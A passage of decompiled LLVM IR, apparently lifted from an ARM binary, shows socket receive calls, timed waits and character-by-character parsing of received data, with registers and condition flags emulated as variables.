  %v4_a3ac = and i32 %v3_a3ac, %v2_a3a8
  %v5_a3ac = icmp slt i32 %v4_a3ac, 0
  store i1 %v5_a3ac, i1* %cpsr_v.global-to-local, align 1
  %v6_a3ac = icmp slt i32 %v1_a3ac, 0
  store i1 %v6_a3ac, i1* %cpsr_n.global-to-local, align 1
  %v7_a3ac = icmp eq i32 %v2_a3a8, 11
  store i1 %v7_a3ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a3ac, label %dec_label_pc_a7f0, label %dec_label_pc_a3b4

dec_label_pc_a3b4:                                ; preds = %dec_label_pc_a3a8, %dec_label_pc_a678
  %v0_a3b4 = load i32, i32* @r8, align 4
  %v1_a3b4 = add i32 %v0_a3b4, -1456
  %v2_a3b4 = inttoptr i32 %v1_a3b4 to i32*
  %v3_a3b4 = load i32, i32* %v2_a3b4, align 4
  store i32 %v3_a3b4, i32* %r0.global-to-local, align 4
  %v1_a3b8 = call i32 @close(i32 %v3_a3b4)
  store i32 %v1_a3b8, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v1_a3c4 = load i32, i32* @r8, align 4
  %v2_a3c4 = add i32 %v1_a3c4, -1456
  %v3_a3c4 = inttoptr i32 %v2_a3c4 to i32*
  store i32 -1, i32* %v3_a3c4, align 4
  %v0_a3c8 = load i32, i32* %r1.global-to-local, align 4
  %v1_a3c8 = trunc i32 %v0_a3c8 to i8
  %v2_a3c8 = load i32, i32* @r8, align 4
  %v3_a3c8 = add i32 %v2_a3c8, -1452
  %v4_a3c8 = inttoptr i32 %v3_a3c8 to i8*
  store i8 %v1_a3c8, i8* %v4_a3c8, align 1
  br label %dec_label_pc_9590

dec_label_pc_a3d0:                                ; preds = %dec_label_pc_a080, %dec_label_pc_a0a4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 37, i32* %r0.global-to-local, align 4
  %v3_a3d8 = call i32 @function_12f90(i32 37, i32* null)
  %v0_a3dc = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_a3dc, i32* @r1, align 4
  store i32 %v3_a3d8, i32* %r2.global-to-local, align 4
  store i32 %v2_8fd8, i32* %r0.global-to-local, align 4
  %v4_a3e8 = call i32 @function_13cf0(i8* %tmp200, i32 %v0_a3dc, i32 %v3_a3d8)
  store i32 %v4_a3e8, i32* %r0.global-to-local, align 4
  %v1_a3f0 = add i32 %v4_a3e8, 1
  %v2_a3f0 = icmp eq i32 %v4_a3e8, -1
  store i1 %v2_a3f0, i1* %cpsr_c.global-to-local, align 1
  %v3_a3f0 = sub i32 0, %v4_a3e8
  %v4_a3f0 = and i32 %v1_a3f0, %v3_a3f0
  %v5_a3f0 = icmp slt i32 %v4_a3f0, 0
  store i1 %v5_a3f0, i1* %cpsr_v.global-to-local, align 1
  %v6_a3f0 = icmp slt i32 %v1_a3f0, 0
  store i1 %v6_a3f0, i1* %cpsr_n.global-to-local, align 1
  %v7_a3f0 = icmp eq i32 %v1_a3f0, 0
  store i1 %v7_a3f0, i1* %cpsr_z.global-to-local, align 1
  store i32 -20773, i32* @r5, align 4
  br i1 %v7_a3f0, label %dec_label_pc_a618, label %dec_label_pc_a3fc

dec_label_pc_a3fc:                                ; preds = %dec_label_pc_a3d0
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 37, i32* %r0.global-to-local, align 4
  %v3_a404 = call i32 @function_12f90(i32 37, i32* null)
  %v0_a408 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_a408, i32* @r1, align 4
  store i32 %v3_a404, i32* %r2.global-to-local, align 4
  store i32 %v2_8fd8, i32* %r0.global-to-local, align 4
  %v4_a414 = call i32 @function_13cf0(i8* %tmp200, i32 %v0_a408, i32 %v3_a404)
  store i32 %v4_a414, i32* %r0.global-to-local, align 4
  store i32 %v2_94a0, i32* %ip.global-to-local, align 4
  %v2_a420 = add i32 %v4_a414, %v2_94a0
  store i32 %v2_a420, i32* %r3.global-to-local, align 4
  %v1_a424 = load i32, i32* @r5, align 4
  %v2_a424 = add i32 %v1_a424, %v2_a420
  %v3_a424 = inttoptr i32 %v2_a424 to i8*
  %v4_a424 = load i8, i8* %v3_a424, align 1
  store i32 %v2_8fd8, i32* %lr.global-to-local, align 4
  %v2_a42c = icmp ugt i8 %v4_a424, 31
  store i1 %v2_a42c, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_a42c = icmp ult i8 %v4_a424, 32
  store i1 %v6_a42c, i1* %cpsr_n.global-to-local, align 1
  %v7_a42c = icmp eq i8 %v4_a424, 32
  store i1 %v7_a42c, i1* %cpsr_z.global-to-local, align 1
  %v2_a434 = zext i1 %v7_a42c to i32
  %v2_a434.v4_a414 = add i32 %v2_a434, %v4_a414
  store i32 %v2_a434.v4_a414, i32* @r4, align 4
  %v2_a438 = add i32 %v2_a434.v4_a414, %v2_8fd8
  store i32 %v2_a438, i32* @r6, align 4
  store i32 %v2_a438, i32* %r0.global-to-local, align 4
  %v1_a440 = load i32, i32* %fp.global-to-local, align 4
  %v2_a440 = sub i32 %v1_a440, %v2_a434.v4_a414
  store i32 %v2_a440, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_142f0.88 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v4_a44c = call i32 @function_13a60(i32 %v2_a438, i32 %v2_a440, i32 ptrtoint ([3 x i8]* @global_var_142f0.88 to i32), i32 2)
  store i32 %v4_a44c, i32* %r0.global-to-local, align 4
  %v1_a450 = add i32 %v4_a44c, 1
  %v2_a450 = icmp eq i32 %v4_a44c, -1
  store i1 %v2_a450, i1* %cpsr_c.global-to-local, align 1
  %v3_a450 = sub i32 0, %v4_a44c
  %v4_a450 = and i32 %v1_a450, %v3_a450
  %v5_a450 = icmp slt i32 %v4_a450, 0
  store i1 %v5_a450, i1* %cpsr_v.global-to-local, align 1
  %v6_a450 = icmp slt i32 %v1_a450, 0
  store i1 %v6_a450, i1* %cpsr_n.global-to-local, align 1
  %v7_a450 = icmp eq i32 %v1_a450, 0
  store i1 %v7_a450, i1* %cpsr_z.global-to-local, align 1
  store i32 %v4_a44c, i32* @r7, align 4
  br i1 %v7_a450, label %dec_label_pc_a618, label %dec_label_pc_a45c

dec_label_pc_a45c:                                ; preds = %dec_label_pc_a3fc
  store i32 %v2_94a0, i32* %r1.global-to-local, align 4
  %v1_a464 = load i32, i32* @r4, align 4
  %v2_a464 = add i32 %v1_a464, %v2_94a0
  %v1_a468 = add i32 %v4_a44c, -1
  %v2_a468 = icmp ne i32 %v4_a44c, 0
  store i1 %v2_a468, i1* %cpsr_c.global-to-local, align 1
  %v3_a468 = sub i32 0, %v4_a44c
  %v4_a468 = and i32 %v4_a44c, %v3_a468
  %v5_a468 = icmp slt i32 %v4_a468, 0
  store i1 %v5_a468, i1* %cpsr_v.global-to-local, align 1
  %v6_a468 = icmp slt i32 %v1_a468, 0
  store i1 %v6_a468, i1* %cpsr_n.global-to-local, align 1
  %v7_a468 = icmp eq i32 %v4_a44c, 1
  store i1 %v7_a468, i1* %cpsr_z.global-to-local, align 1
  %v1_a46c = add i32 %v2_a464, -20736
  store i32 %v1_a46c, i32* %r3.global-to-local, align 4
  %v7_a470 = icmp sgt i32 %v4_a44c, 1
  br i1 %v7_a470, label %bb236, label %bb237

bb236:                                            ; preds = %dec_label_pc_a45c
  %v9_a470 = add i32 %v4_a44c, -2
  store i32 %v9_a470, i32* @r7, align 4
  br label %bb237

bb237:                                            ; preds = %dec_label_pc_a45c, %bb236
  %v3_a47c = phi i32 [ %v4_a44c, %dec_label_pc_a45c ], [ %v9_a470, %bb236 ]
  %v1_a474 = add i32 %v2_a464, -20773
  store i32 0, i32* %r2.global-to-local, align 4
  %v4_a47c = add i32 %v1_a474, %v3_a47c
  %v5_a47c = inttoptr i32 %v4_a47c to i8*
  store i8 0, i8* %v5_a47c, align 1
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 %v10_9048, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-40, align 4
  store i32 %v2_8fd8, i32* %lr.global-to-local, align 4
  %v1_a490 = load i32, i32* @r4, align 4
  %v2_a490 = add i32 %v1_a490, %v2_8fd8
  %v3_a490 = inttoptr i32 %v2_a490 to i8*
  %v4_a490 = load i8, i8* %v3_a490, align 1
  %v6_a490 = zext i8 %v4_a490 to i32
  store i32 %v6_a490, i32* %r0.global-to-local, align 4
  %v1_a494 = add nsw i32 %v6_a490, -48
  store i32 %v1_a494, i32* %r3.global-to-local, align 4
  %v2_a498 = icmp ugt i32 %v1_a494, 8
  store i1 %v2_a498, i1* %cpsr_c.global-to-local, align 1
  %v3_a498 = sub nsw i32 56, %v6_a490
  %v4_a498 = and i32 %v3_a498, %v1_a494
  %v5_a498 = icmp slt i32 %v4_a498, 0
  store i1 %v5_a498, i1* %cpsr_v.global-to-local, align 1
  %v6_a498 = icmp ult i8 %v4_a490, 57
  store i1 %v6_a498, i1* %cpsr_n.global-to-local, align 1
  %v7_a498 = icmp eq i32 %v1_a494, 9
  store i1 %v7_a498, i1* %cpsr_z.global-to-local, align 1
  %v2_a49c = xor i1 %v7_a498, true
  %v3_a49c = and i1 %v2_a498, %v2_a49c
  br i1 %v3_a49c, label %.thread143, label %dec_label_pc_a4a4

.thread143:                                       ; preds = %bb237
  %v4_a49c = load i32, i32* @r6, align 4
  br label %dec_label_pc_a4cc

dec_label_pc_a4a4:                                ; preds = %bb237
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_a4b4.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_a4a8

dec_label_pc_a4a8:                                ; preds = %dec_label_pc_a4a8, %dec_label_pc_a4a4
  %v0_a4a8 = phi i32 [ %v1_a4a8, %dec_label_pc_a4a8 ], [ 0, %dec_label_pc_a4a4 ]
  %v1_a4a8 = add i32 %v0_a4a8, 1
  store i32 %v1_a4a8, i32* %ip.global-to-local, align 4
  store i32 %v10_9048, i32* %r1.global-to-local, align 4
  store i32 %v1_a4a8, i32* %stack_var_-40, align 4
  %v2_a4b4 = add i32 %v1_a4a8, %v1_a4b4.pre
  %v3_a4b4 = inttoptr i32 %v2_a4b4 to i8*
  %v4_a4b4 = load i8, i8* %v3_a4b4, align 1
  %v6_a4b4 = zext i8 %v4_a4b4 to i32
  store i32 %v6_a4b4, i32* %r0.global-to-local, align 4
  %v1_a4b8 = add nsw i32 %v6_a4b4, -48
  %v2_a4bc = icmp ugt i32 %v1_a4b8, 8
  store i1 %v2_a4bc, i1* %cpsr_c.global-to-local, align 1
  %v3_a4bc = sub nsw i32 56, %v6_a4b4
  %v4_a4bc = and i32 %v3_a4bc, %v1_a4b8
  %v5_a4bc = icmp slt i32 %v4_a4bc, 0
  store i1 %v5_a4bc, i1* %cpsr_v.global-to-local, align 1
  %v6_a4bc = icmp ult i8 %v4_a4b4, 57
  store i1 %v6_a4bc, i1* %cpsr_n.global-to-local, align 1
  %v7_a4bc = icmp eq i32 %v1_a4b8, 9
  store i1 %v7_a4bc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_a4a8, i32* %r3.global-to-local, align 4
  %v2_a4c4 = xor i1 %v2_a4bc, true
  %v3_a4c4 = or i1 %v7_a4bc, %v2_a4c4
  br i1 %v3_a4c4, label %dec_label_pc_a4a8, label %dec_label_pc_a4cc

dec_label_pc_a4cc:                                ; preds = %dec_label_pc_a4a8, %.thread143
  %v2_a4d8 = phi i32 [ %v4_a49c, %.thread143 ], [ %v2_a4b4, %dec_label_pc_a4a8 ]
  %v0_a4cc = phi i32 [ %v6_a490, %.thread143 ], [ %v6_a4b4, %dec_label_pc_a4a8 ]
  store i32 %v2_a4d8, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_a4cc = icmp eq i32 %v0_a4cc, 0
  store i1 %v2_a4cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a4cc, label %dec_label_pc_a618, label %dec_label_pc_a4d4

dec_label_pc_a4d4:                                ; preds = %dec_label_pc_a4cc
  store i32 0, i32* @r5, align 4
  %v3_a4d8 = inttoptr i32 %v2_a4d8 to i8*
  store i8 0, i8* %v3_a4d8, align 1
  store i32 %v10_9048, i32* %r2.global-to-local, align 4
  %v3_a4e0 = load i32, i32* %stack_var_-40, align 4
  %v1_a4e4 = add i32 %v3_a4e0, 1
  store i32 %v1_a4e4, i32* %ip.global-to-local, align 4
  store i32 %v1_a4e4, i32* %stack_var_-40, align 4
  %v0_a4ec = load i32, i32* @r6, align 4
  %v2_a4ec = add i32 %v0_a4ec, %v1_a4e4
  %v3_a4ec = inttoptr i32 %v2_a4ec to i8*
  %v4_a4ec = load i8, i8* %v3_a4ec, align 1
  %v6_a4ec = zext i8 %v4_a4ec to i32
  store i32 %v6_a4ec, i32* %r3.global-to-local, align 4
  %v2_a4f0 = icmp ugt i8 %v4_a4ec, 31
  store i1 %v2_a4f0, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_a4f0 = icmp ult i8 %v4_a4ec, 32
  store i1 %v6_a4f0, i1* %cpsr_n.global-to-local, align 1
  %v7_a4f0 = icmp eq i8 %v4_a4ec, 32
  store i1 %v7_a4f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a4f0, label %bb238, label %.thread57

.thread57:                                        ; preds = %dec_label_pc_a4d4
  store i32 %v2_a4ec, i32* @r4, align 4
  br label %bb239

bb238:                                            ; preds = %dec_label_pc_a4d4
  %v2_a4f4 = add i32 %v3_a4e0, 2
  store i32 %v2_a4f4, i32* %ip.global-to-local, align 4
  %v2_a4f8 = add i32 %v0_a4ec, %v2_a4f4
  store i32 %v2_a4f8, i32* @r4, align 4
  store i32 %v2_a4f4, i32* %stack_var_-40, align 4
  br label %bb239

bb239:                                            ; preds = %.thread57, %bb238
  %v0_a500 = phi i32 [ %v2_a4ec, %.thread57 ], [ %v2_a4f8, %bb238 ]
  store i32 %v0_a500, i32* %r0.global-to-local, align 4
  %v1_a504 = inttoptr i32 %v0_a500 to i8*
  %v2_a504 = call i32 @function_1399c(i8* %v1_a504)
  store i32 ptrtoint ([5 x i8]* @global_var_14328.100 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a504, i32* @r1, align 4
  %v0_a510 = load i32, i32* @r4, align 4
  store i32 %v0_a510, i32* %r0.global-to-local, align 4
  %v4_a514 = inttoptr i32 %v0_a510 to i8*
  %v5_a514 = call i32 @function_13cf0(i8* %v4_a514, i32 %v2_a504, i32 ptrtoint ([5 x i8]* @global_var_14328.100 to i32))
  store i32 %v5_a514, i32* %r0.global-to-local, align 4
  %v1_a518 = add i32 %v5_a514, 1
  %v2_a518 = icmp eq i32 %v5_a514, -1
  store i1 %v2_a518, i1* %cpsr_c.global-to-local, align 1
  %v3_a518 = sub i32 0, %v5_a514
  %v4_a518 = and i32 %v1_a518, %v3_a518
  %v5_a518 = icmp slt i32 %v4_a518, 0
  store i1 %v5_a518, i1* %cpsr_v.global-to-local, align 1
  %v6_a518 = icmp slt i32 %v1_a518, 0
  store i1 %v6_a518, i1* %cpsr_n.global-to-local, align 1
  %v7_a518 = icmp eq i32 %v1_a518, 0
  store i1 %v7_a518, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a518, label %.thread61, label %dec_label_pc_a528

.thread61:                                        ; preds = %bb239
  store i32 %v10_9048, i32* %r1.global-to-local, align 4
  %v4_a520 = load i32, i32* %v11_904c, align 4
  store i32 %v4_a520, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_a55c

dec_label_pc_a528:                                ; preds = %bb239
  store i32 %v10_9048, i32* %r3.global-to-local, align 4
  %v3_a52c = load i32, i32* %stack_var_-40, align 4
  %v0_a530 = load i32, i32* @r6, align 4
  %v2_a530 = add i32 %v0_a530, %v3_a52c
  store i32 %v2_a530, i32* @r4, align 4
  store i32 %v2_a530, i32* %r0.global-to-local, align 4
  %v1_a538 = inttoptr i32 %v2_a530 to i8*
  %v2_a538 = call i32 @function_1399c(i8* %v1_a538)
  store i32 ptrtoint ([5 x i8]* @global_var_14328.100 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a538, i32* @r1, align 4
  %v0_a544 = load i32, i32* @r4, align 4
  store i32 %v0_a544, i32* %r0.global-to-local, align 4
  %v4_a548 = inttoptr i32 %v0_a544 to i8*
  %v5_a548 = call i32 @function_13cf0(i8* %v4_a548, i32 %v2_a538, i32 ptrtoint ([5 x i8]* @global_var_14328.100 to i32))
  store i32 %v5_a548, i32* %r0.global-to-local, align 4
  store i32 %v10_9048, i32* %lr.global-to-local, align 4
  %v3_a550 = load i32, i32* %stack_var_-40, align 4
  %v2_a554 = add i32 %v3_a550, %v5_a548
  store i32 %v2_a554, i32* %ip.global-to-local, align 4
  store i32 %v2_a554, i32* %stack_var_-40, align 4
  br label %dec_label_pc_a55c

dec_label_pc_a55c:                                ; preds = %.thread61, %dec_label_pc_a528
  %v0_aae4 = phi i32 [ %v4_a520, %.thread61 ], [ %v2_a554, %dec_label_pc_a528 ]
  %v0_a55c = load i32, i32* @r6, align 4
  %v2_a55c = add i32 %v0_a55c, %v0_aae4
  %v3_a55c = inttoptr i32 %v2_a55c to i8*
  %v4_a55c = load i8, i8* %v3_a55c, align 1
  %v6_a55c = zext i8 %v4_a55c to i32
  store i32 %v6_a55c, i32* %r3.global-to-local, align 4
  %v2_a560 = icmp ugt i8 %v4_a55c, 33
  store i1 %v2_a560, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_a560 = icmp ult i8 %v4_a55c, 34
  store i1 %v6_a560, i1* %cpsr_n.global-to-local, align 1
  %v7_a560 = icmp eq i8 %v4_a55c, 34
  store i1 %v7_a560, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a560, label %dec_label_pc_aae4, label %dec_label_pc_a568

dec_label_pc_a568:                                ; preds = %dec_label_pc_aae4, %dec_label_pc_a55c, %dec_label_pc_ab0c
  %v0_a568 = load i32, i32* @r6, align 4
  store i32 %v0_a568, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v2_a570 = inttoptr i32 %v0_a568 to i8*
  %v3_a570 = call i32 @function_13ac8(i8* %v2_a570, i32 10)
  store i32 %v3_a570, i32* %r0.global-to-local, align 4
  %v1_a574 = add i32 %v3_a570, -1
  store i32 %v1_a574, i32* %r3.global-to-local, align 4
  %v1_a578 = add i32 %v3_a570, -9
  %v2_a578 = icmp ugt i32 %v1_a574, 7
  store i1 %v2_a578, i1* %cpsr_c.global-to-local, align 1
  %v3_a578 = sub i32 8, %v3_a570
  %v4_a578 = and i32 %v3_a578, %v1_a574
  %v5_a578 = icmp slt i32 %v4_a578, 0
  store i1 %v5_a578, i1* %cpsr_v.global-to-local, align 1
  %v6_a578 = icmp slt i32 %v1_a578, 0
  store i1 %v6_a578, i1* %cpsr_n.global-to-local, align 1
  %v7_a578 = icmp eq i32 %v1_a574, 8
  store i1 %v7_a578, i1* %cpsr_z.global-to-local, align 1
  %v2_a57c = xor i1 %v2_a578, true
  %v3_a57c = or i1 %v7_a578, %v2_a57c
  br i1 %v3_a57c, label %dec_label_pc_a590.preheader, label %dec_label_pc_a5a4

dec_label_pc_a590.preheader:                      ; preds = %dec_label_pc_a568
  store i32 %v2_9530, i32* %ip.global-to-local, align 4
  %v6_a580 = add i32 %v3_a570, %v2_9530
  store i32 %v6_a580, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_a590

dec_label_pc_a58c:                                ; preds = %dec_label_pc_a590
  %v1_a58c = call i32 @sleep(i32 1)
  store i32 %v1_a58c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a590

dec_label_pc_a590:                                ; preds = %dec_label_pc_a590.preheader, %dec_label_pc_a58c
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_a594 = call i32 @time(i32* null)
  %v1_a598 = load i32, i32* %r4.global-to-local, align 4
  %v2_a598 = sub i32 %v2_a594, %v1_a598
  %v3_a598 = icmp uge i32 %v2_a594, %v1_a598
  store i1 %v3_a598, i1* %cpsr_c.global-to-local, align 1
  %v4_a598 = xor i32 %v1_a598, %v2_a594
  %v5_a598 = xor i32 %v2_a598, %v2_a594
  %v6_a598 = and i32 %v5_a598, %v4_a598
  %v7_a598 = icmp slt i32 %v6_a598, 0
  store i1 %v7_a598, i1* %cpsr_v.global-to-local, align 1
  %v8_a598 = icmp slt i32 %v2_a598, 0
  store i1 %v8_a598, i1* %cpsr_n.global-to-local, align 1
  %v9_a598 = icmp eq i32 %v2_a594, %v1_a598
  store i1 %v9_a598, i1* %cpsr_z.global-to-local, align 1
  store i32 1, i32* %r0.global-to-local, align 4
  br i1 %v3_a598, label %dec_label_pc_a5a4, label %dec_label_pc_a58c

dec_label_pc_a5a4:                                ; preds = %dec_label_pc_a590, %dec_label_pc_a568
  store i32 %v10_9048, i32* %lr.global-to-local, align 4
  %v3_a5a8 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_a5a8, i32* @r4, align 4
  %v0_a5ac = load i32, i32* @r6, align 4
  %v2_a5ac = add i32 %v0_a5ac, %v3_a5a8
  store i32 %v2_a5ac, i32* @r5, align 4
  store i32 %v2_a5ac, i32* %r0.global-to-local, align 4
  %v1_a5b4 = inttoptr i32 %v2_a5ac to i8*
  %v2_a5b4 = call i32 @function_1399c(i8* %v1_a5b4)
  store i32 ptrtoint ([5 x i8]* @global_var_14320.98 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a5b4, i32* @r1, align 4
  %v0_a5c0 = load i32, i32* @r5, align 4
  store i32 %v0_a5c0, i32* %r0.global-to-local, align 4
  %v4_a5c4 = inttoptr i32 %v0_a5c0 to i8*
  %v5_a5c4 = call i32 @function_13cf0(i8* %v4_a5c4, i32 %v2_a5b4, i32 ptrtoint ([5 x i8]* @global_var_14320.98 to i32))
  store i32 %v5_a5c4, i32* %r0.global-to-local, align 4
  %v1_a5c8 = add i32 %v5_a5c4, -4
  %v2_a5c8 = icmp ugt i32 %v5_a5c4, 3
  store i1 %v2_a5c8, i1* %cpsr_c.global-to-local, align 1
  %v3_a5c8 = sub i32 3, %v5_a5c4
  %v4_a5c8 = and i32 %v3_a5c8, %v5_a5c4
  %v5_a5c8 = icmp slt i32 %v4_a5c8, 0
  store i1 %v5_a5c8, i1* %cpsr_v.global-to-local, align 1
  %v6_a5c8 = icmp slt i32 %v1_a5c8, 0
  store i1 %v6_a5c8, i1* %cpsr_n.global-to-local, align 1
  %v7_a5c8 = icmp eq i32 %v5_a5c4, 4
  store i1 %v7_a5c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a5c8, label %dec_label_pc_a9c0, label %dec_label_pc_a5d0

dec_label_pc_a5d0:                                ; preds = %dec_label_pc_a5a4
  %v0_a5d0 = load i32, i32* @r6, align 4
  %v1_a5d0 = load i32, i32* @r4, align 4
  %v2_a5d0 = add i32 %v1_a5d0, %v0_a5d0
  %v3_a5d0 = inttoptr i32 %v2_a5d0 to i8*
  %v4_a5d0 = load i8, i8* %v3_a5d0, align 1
  %v6_a5d0 = zext i8 %v4_a5d0 to i32
  store i32 %v6_a5d0, i32* %r3.global-to-local, align 4
  %v2_a5d4 = icmp ugt i8 %v4_a5d0, 46
  store i1 %v2_a5d4, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_a5d4 = icmp ult i8 %v4_a5d0, 47
  store i1 %v6_a5d4, i1* %cpsr_n.global-to-local, align 1
  %v7_a5d4 = icmp eq i8 %v4_a5d0, 47
  store i1 %v7_a5d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a5d4, label %dec_label_pc_ab38, label %dec_label_pc_a5dc

dec_label_pc_a5dc:                                ; preds = %dec_label_pc_ab54, %dec_label_pc_ab38, %dec_label_pc_aa90, %dec_label_pc_aa74, %dec_label_pc_a5d0, %dec_label_pc_ab84, %dec_label_pc_aac0
  %v0_a5dc = load i32, i32* %sb.global-to-local, align 4
  %v1_a5e0 = add i32 %v0_a5dc, 1431
  store i32 %v1_a5e0, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_142fc.76 to i32), i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v3_a5ec = inttoptr i32 %v1_a5e0 to i32*
  %v5_a5ec = call i32* @memcpy(i32* %v3_a5ec, i32* bitcast ([4 x i8]* @global_var_142fc.76 to i32*), i32 4)
  %v7_a5ec = ptrtoint i32* %v5_a5ec to i32
  store i32 %v7_a5ec, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r3.global-to-local, align 4
  %v2_a5f4 = load i32, i32* @r8, align 4
  %v3_a5f4 = add i32 %v2_a5f4, -1452
  %v4_a5f4 = inttoptr i32 %v3_a5f4 to i8*
  store i8 10, i8* %v4_a5f4, align 1
  br label %dec_label_pc_9590

dec_label_pc_a5fc:                                ; preds = %dec_label_pc_9368
  store i32 %v1_9368, i32* %r3.global-to-local, align 4
  %v1_a600 = trunc i32 %v1_9368 to i8
  store i8 %v1_a600, i8* %v2_93a8, align 1
  %v0_a604 = load i32, i32* @r6, align 4
  %v1_a604 = add i32 %v0_a604, -1431
  %v2_a604 = inttoptr i32 %v1_a604 to i32*
  %v3_a604 = load i32, i32* %v2_a604, align 4
  store i32 %v3_a604, i32* %r0.global-to-local, align 4
  %v1_a608 = call i32 @close(i32 %v3_a604)
  store i32 %v1_a608, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_a610 = load i32, i32* @r6, align 4
  %v2_a610 = add i32 %v1_a610, -1431
  %v3_a610 = inttoptr i32 %v2_a610 to i32*
  store i32 -1, i32* %v3_a610, align 4
  br label %dec_label_pc_9388

dec_label_pc_a618:                                ; preds = %dec_label_pc_a4cc, %dec_label_pc_a3fc, %dec_label_pc_a3d0
  %v0_a618 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_a618, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_14314.94 to i32), i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 %v2_8fd8, i32* %r0.global-to-local, align 4
  %v5_a628 = call i32 @function_13a60(i32 %v2_8fd8, i32 %v0_a618, i32 ptrtoint ([5 x i8]* @global_var_14314.94 to i32), i32 4)
  %v0_a62c = load i32, i32* %sb.global-to-local, align 4
  %v1_a630 = add i32 %v0_a62c, 1431
  store i32 %v1_a630, i32* @r4, align 4
  store i32 %v5_a628, i32* @r5, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_14330.102 to i32), i32* %r1.global-to-local, align 4
  store i32 %v1_a630, i32* %r0.global-to-local, align 4
  %v3_a640 = inttoptr i32 %v1_a630 to i8*
  %v4_a640 = call i32 @function_13d7c(i8* %v3_a640, i32 ptrtoint ([5 x i8]* @global_var_14330.102 to i32))
  store i32 %v4_a640, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_a644 = icmp slt i32 %v4_a640, 0
  store i1 %v1_a644, i1* %cpsr_n.global-to-local, align 1
  %v2_a644 = icmp eq i32 %v4_a640, 0
  store i1 %v2_a644, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a644, label %dec_label_pc_a800, label %dec_label_pc_a64c

dec_label_pc_a64c:                                ; preds = %dec_label_pc_a800, %dec_label_pc_a618
  store i32 7, i32* %r3.global-to-local, align 4
  %v2_a650 = load i32, i32* @r8, align 4
  %v3_a650 = add i32 %v2_a650, -1452
  %v4_a650 = inttoptr i32 %v3_a650 to i8*
  store i8 7, i8* %v4_a650, align 1
  br label %dec_label_pc_a654

dec_label_pc_a654:                                ; preds = %bb245, %dec_label_pc_a64c
  %v0_a654 = load i32, i32* @r5, align 4
  store i32 %v0_a654, i32* %r2.global-to-local, align 4
  %v0_a658 = load i32, i32* @r8, align 4
  %v1_a658 = add i32 %v0_a658, -1456
  %v2_a658 = inttoptr i32 %v1_a658 to i32*
  %v3_a658 = load i32, i32* %v2_a658, align 4
  store i32 %v3_a658, i32* %r0.global-to-local, align 4
  store i32 %v2_8fd8, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_a664 = call i32 @_recv(i32 %v3_a658, i32 %v2_8fd8, i32 %v0_a654, i32 16384)
  store i32 %v4_a664, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9590

dec_label_pc_a66c:                                ; preds = %dec_label_pc_9b5c
  %v2_a66c = add i32 %v0_a66c, -10240
  %v3_a66c = icmp ugt i32 %v0_a66c, 10239
  store i1 %v3_a66c, i1* %cpsr_c.global-to-local, align 1
  %v4_a66c = sub i32 10239, %v0_a66c
  %v5_a66c = and i32 %v4_a66c, %v0_a66c
  %v6_a66c = icmp slt i32 %v5_a66c, 0
  store i1 %v6_a66c, i1* %cpsr_v.global-to-local, align 1
  %v7_a66c = icmp slt i32 %v2_a66c, 0
  store i1 %v7_a66c, i1* %cpsr_n.global-to-local, align 1
  %v8_a66c = icmp eq i32 %v0_a66c, 10240
  store i1 %v8_a66c, i1* %cpsr_z.global-to-local, align 1
  %v5_a670 = icmp slt i32 %v0_a66c, 10240
  br i1 %v5_a670, label %dec_label_pc_9590, label %dec_label_pc_9b78

dec_label_pc_a678:                                ; preds = %dec_label_pc_a380
